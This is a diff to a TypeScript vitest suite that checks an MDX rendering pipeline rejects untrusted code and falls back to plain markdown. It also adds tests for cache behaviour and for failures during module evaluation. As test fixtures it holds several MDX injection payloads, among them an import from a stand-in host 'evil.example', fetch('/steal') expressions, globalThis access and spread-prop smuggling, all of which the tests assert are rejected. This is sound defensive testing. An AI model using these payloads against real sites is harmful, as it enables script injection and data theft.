@@ -1,27 +1,46 @@
+import { readFileSync } from 'node:fs';
+import { join } from 'node:path';
 import { describe, it, expect } from 'vitest';
 import { renderToStaticMarkup } from 'react-dom/server';
-import { validateMdx, renderMdx } from '../lib/mdx';
+import {
+  __clearMdxCacheForTest,
+  __getMdxCacheStatsForTest,
+  __setMdxRunSourceForTest,
+  getCompiled,
+  projectMdx,
+  renderMdx,
+} from '../lib/mdx';
+import { project } from '../lib/projection';
 
 // The MDX adversarial suite (SPEC §18.3 / §6.1). Imported MDX is untrusted code;
 // these fixtures are the attacks the pipeline must survive. Each asserts EXTERNAL
-// behavior — what validateMdx reports and what renderMdx actually emits — never
+// behavior — what projectMdx reports and what renderMdx actually emits — never
 // plugin internals. A regression here is a security regression.
 //
 // The two contracts under test:
-//   validateMdx  → { ok } : the projection endpoint's mdx_ok. false ⇒ the doc
-//                            renders as plain-markdown fallback, never as MDX.
+//   projectMdx   → mdxOk : the projection endpoint's mdx_ok. false ⇒ the doc
+//                           renders as plain-markdown fallback, never as MDX.
 //   renderMdx    → { node, ok } : the page render. ok=false ⇒ fell back safely.
+
+const RUN_THROWS = readFileSync(
+  join(import.meta.dirname, 'fixtures', 'mdx', 'run-throws.mdx'),
+  'utf8',
+);
 
 async function html(content: string): Promise<{ markup: string; ok: boolean }> {
   const { node, ok } = await renderMdx(content);
   return { markup: renderToStaticMarkup(node), ok };
 }
 
+async function mdxOk(content: string): Promise<boolean> {
+  return (await projectMdx(content)).mdxOk;
+}
+
 describe('MDX adversarial suite (SPEC §18.3)', () => {
   describe('import / export smuggling → rejected, falls back', () => {
     it('rejects an import statement', async () => {
       const src = "import secret from 'https://evil.example/x'\n\n# Doc";
-      expect((await validateMdx(src)).ok).toBe(false);
+      expect(await mdxOk(src)).toBe(false);
       const { markup, ok } = await html(src);
       expect(ok).toBe(false); // fell back to plain markdown
       expect(markup).toContain('Doc');
@@ -33,37 +52,37 @@ describe('MDX adversarial suite (SPEC §18.3)', () => {
 
     it('rejects an export statement', async () => {
       const src = 'export const x = 1\n\n# Doc';
-      expect((await validateMdx(src)).ok).toBe(false);
+      expect(await mdxOk(src)).toBe(false);
       expect((await html(src)).ok).toBe(false);
     });
 
     it('rejects export default (component override attempt)', async () => {
       const src = 'export default function () { return null }\n\ntext';
-      expect((await validateMdx(src)).ok).toBe(false);
+      expect(await mdxOk(src)).toBe(false);
     });
   });
 
   describe('expression payloads → non-literals rejected, literals allowed', () => {
     it('rejects a function-call expression', async () => {
-      expect((await validateMdx('Value {fetch("/steal")} here')).ok).toBe(false);
+      expect(await mdxOk('Value {fetch("/steal")} here')).toBe(false);
     });
 
     it('rejects an identifier expression', async () => {
-      expect((await validateMdx('{globalThis}')).ok).toBe(false);
+      expect(await mdxOk('{globalThis}')).toBe(false);
     });
 
     it('rejects a computed expression', async () => {
-      expect((await validateMdx('sum: {1 + 1}')).ok).toBe(false);
+      expect(await mdxOk('sum: {1 + 1}')).toBe(false);
     });
 
     it('allows a bare string-literal expression', async () => {
       const { ok } = await html('Value {"forty-two"} here');
       expect(ok).toBe(true);
-      expect((await validateMdx('Value {"forty-two"} here')).ok).toBe(true);
+      expect(await mdxOk('Value {"forty-two"} here')).toBe(true);
     });
 
     it('allows an empty expression / comment', async () => {
-      expect((await validateMdx('a {/* note */} b')).ok).toBe(true);
+      expect(await mdxOk('a {/* note */} b')).toBe(true);
     });
   });
 
@@ -108,22 +127,22 @@ describe('MDX adversarial suite (SPEC §18.3)', () => {
 
   describe('attribute-channel smuggling → rejected', () => {
     it('rejects a non-literal expression in a component prop', async () => {
-      expect((await validateMdx('<Callout title={fetch("/x")}>hi</Callout>')).ok).toBe(false);
+      expect(await mdxOk('<Callout title={fetch("/x")}>hi</Callout>')).toBe(false);
     });
 
     it('rejects a spread attribute', async () => {
-      expect((await validateMdx('<Callout {...props}>hi</Callout>')).ok).toBe(false);
+      expect(await mdxOk('<Callout {...props}>hi</Callout>')).toBe(false);
     });
 
     it('allows a literal-expression prop', async () => {
-      expect((await validateMdx('<Callout type={"warning"}>hi</Callout>')).ok).toBe(true);
+      expect(await mdxOk('<Callout type={"warning"}>hi</Callout>')).toBe(true);
     });
   });
 
   describe('unknown components → neutral box, never a crash', () => {
     it('renders an unknown component as the unsupported box, compiles ok', async () => {
       const src = '<Danger payload="x">boom</Danger>';
-      expect((await validateMdx(src)).ok).toBe(true);
+      expect(await mdxOk(src)).toBe(true);
       const { markup, ok } = await html(src);
       expect(ok).toBe(true);
       expect(markup).toContain('Unsupported component');
@@ -178,6 +197,43 @@ describe('MDX adversarial suite (SPEC §18.3)', () => {
       expect(markup).toMatch(/<h1\b[^>]*>Title<\/h1>/);
       expect(markup).toMatch(/<code\b[^>]*>code<\/code>/);
       expect(markup).toContain('href="https://ex.com"');
+    });
+  });
+
+  describe('compile/run projection contract', () => {
+    it('returns mdx_ok=false and the markdown fallback projection when module evaluation throws', async () => {
+      __clearMdxCacheForTest();
+      __setMdxRunSourceForTest(async () => {
+        throw new Error('forced run failure');
+      });
+      try {
+        const result = await projectMdx(RUN_THROWS);
+        expect(result.mdxOk).toBe(false);
+        expect(result.plainText).toBe(project(RUN_THROWS).plainText);
+        expect(result.warnings.join('\n')).toContain('forced run failure');
+
+        const { markup, ok } = await html(RUN_THROWS);
+        expect(ok).toBe(false);
+        expect(markup).toContain('Run failure fixture');
+      } finally {
+        __setMdxRunSourceForTest(null);
+        __clearMdxCacheForTest();
+      }
+    });
+
+    it('uses the projection-warmed cache for the first render', async () => {
+      __clearMdxCacheForTest();
+      await projectMdx('# Cache warm\n\n<Note>ok</Note>');
+      const afterProjection = __getMdxCacheStatsForTest();
+
+      await renderMdx('# Cache warm\n\n<Note>ok</Note>');
+      const afterRender = __getMdxCacheStatsForTest();
+
+      expect(afterRender.l1Hits).toBe(afterProjection.l1Hits + 1);
+      expect(afterRender.produceCalls).toBe(afterProjection.produceCalls);
+      expect(afterRender.compileCalls).toBe(afterProjection.compileCalls);
+      expect(afterRender.runCalls).toBe(afterProjection.runCalls);
+      expect((await getCompiled('# Cache warm\n\n<Note>ok</Note>')).ok).toBe(true);
     });
   });
 });
